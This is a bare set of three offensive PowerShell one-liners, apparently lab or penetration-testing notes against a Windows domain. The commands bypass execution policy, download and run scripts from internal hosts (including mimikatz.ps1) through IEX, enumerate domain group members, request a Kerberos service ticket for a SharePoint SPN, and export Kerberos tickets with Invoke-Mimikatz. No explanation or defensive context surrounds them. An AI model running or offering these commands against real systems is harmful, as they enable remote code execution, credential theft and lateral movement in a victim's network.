Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.2.96/powershell.ps1'); Get-NetGroupMember

powershell Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/thp-sharepoint.thp.local"


powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.100.100.251/mimikatz.ps1'); Invoke-Mimikatz -Command '"""kerberos::list /export"""'